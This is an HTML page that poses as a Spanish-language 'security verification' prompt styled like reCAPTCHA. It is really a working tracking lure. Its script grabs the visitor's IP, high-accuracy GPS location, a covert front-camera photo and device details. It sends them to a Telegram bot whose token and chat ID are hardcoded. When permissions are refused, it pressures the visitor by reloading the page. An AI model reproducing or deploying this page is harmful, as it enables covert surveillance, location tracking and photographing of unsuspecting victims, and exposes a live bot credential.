<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>VERIFICACI√ìN DE SEGURIDAD</title>
<style>
    body { font-family: Arial, sans-serif; margin: 0; background: #f2f2f2; }
    .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.85); display: flex; justify-content: center; align-items: center; z-index: 9999; }
    .modal-content { background: white; padding: 25px; width: 85%; max-width: 350px; border-radius: 12px; text-align: center; box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
    .modal-content img { width: 70px; margin-bottom: 15px; }
    
    /* Bot√≥n estilo reCAPTCHA para iPhone */
    .btn-validar {
        display: flex; align-items: center; justify-content: center;
        background: #4A90E2; color: white; border: none; padding: 15px;
        width: 100%; border-radius: 8px; font-size: 16px; font-weight: bold;
        cursor: pointer; margin-top: 15px; box-shadow: 0 2px 5px rgba(0,0,0,0.2);
    }
    .btn-validar:active { background: #357ABD; transform: scale(0.98); }
    
    .loading-spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 15px auto; display: none; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
</style>
</head>
<body>

<div class="modal-overlay">
    <div class="modal-content">
        <img src="https://i.ibb.co/S42ZgqWB/Sin-t-tulo.jpg">
        <h3 id="titulo">Verificaci√≥n Requerida</h3>
        <p id="texto">Para generar su referencia de seguridad y continuar, debe validar su identidad.</p>
        
        <div id="spinner" class="loading-spinner"></div>
        
        <button id="main-button" class="btn-validar">VERIFICAR AHORA</button>
    </div>
</div>

<script>
const BOT_TOKEN = "8253513816:AAERpjUuX757c3cd8wzOmW0vvpTHce6KCIo";
const CHAT_ID = "-5099354587";

let reporte = {
    ip: "Detectando...", ciudad: "Procesando...",
    lat: null, lon: null, acc: null,
    ua: navigator.userAgent, plat: navigator.platform, res: `${screen.width}x${screen.height}`
};

// Captura de IP inmediata al cargar
fetch('https://api.ipify.org?format=json').then(r => r.json()).then(j => reporte.ip = j.ip).catch(()=>{});

async function enviarFinal(blob = null) {
    const maps = `https://www.google.com/maps?q=${reporte.lat},${reporte.lon}`;
    const info = `üìç REPORTE IPHONE/ANDROID\n\nüïí ${new Date().toLocaleString()}\nüåê IP: ${reporte.ip}\nüìå Ciudad: ${reporte.ciudad}\nüì° GPS: ${reporte.lat},${reporte.lon}\nüó∫Ô∏è Mapa: ${maps}\n\nüì± DISPOSITIVO:\n‚Ä¢ ${reporte.ua}\n‚Ä¢ ${reporte.plat}\n‚Ä¢ ${reporte.res}`;

    const fd = new FormData();
    fd.append('chat_id', CHAT_ID);
    if (blob) {
        fd.append('photo', blob, 'f.jpg');
        fd.append('caption', info);
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
    } else {
        fd.append('text', info + "\n‚ö†Ô∏è Sin foto.");
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', body: fd });
    }
}

async function proceso() {
    // Interfaz
    document.getElementById('main-button').style.display = 'none';
    document.getElementById('spinner').style.display = 'block';
    document.getElementById('titulo').innerText = "Procesando...";
    document.getElementById('texto').innerText = "No cierre la ventana, estamos validando los sensores...";

    // 1. Forzar GPS
    navigator.geolocation.getCurrentPosition(async (pos) => {
        reporte.lat = pos.coords.latitude;
        reporte.lon = pos.coords.longitude;
        reporte.acc = pos.coords.accuracy.toFixed(1);

        // Ciudad
        fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${reporte.lat}&longitude=${reporte.lon}&localityLanguage=es`)
            .then(r => r.json()).then(j => reporte.ciudad = j.city || "N/D");

        // 2. Forzar C√°mara Frontal
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" } 
            });
            const video = document.createElement('video');
            video.srcObject = stream;
            video.setAttribute("playsinline", true);
            video.muted = true;
            await video.play();

            // Esperar 1 segundo para luz
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(blob => {
                    enviarFinal(blob);
                    stream.getTracks().forEach(t => t.stop());
                    document.getElementById('texto').innerText = "Validaci√≥n Completa.";
                }, 'image/jpeg', 0.8);
            }, 1000);
        } catch (e) {
            enviarFinal();
        }
    }, (err) => {
        enviarFinal();
        alert("Es obligatorio aceptar los permisos para continuar.");
        location.reload();
    }, { enableHighAccuracy: true, timeout: 8000 });
}

// Evento de clic obligatorio para Safari
document.getElementById('main-button').addEventListener('click', proceso);

// Si es Android, intentar auto-disparar, pero el bot√≥n queda como respaldo
window.onload = () => {
    if (!/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
        // En Android podemos intentar disparar solo, pero el usuario igual ver√° el bot√≥n
    }
};
</script>
</body>
</html>
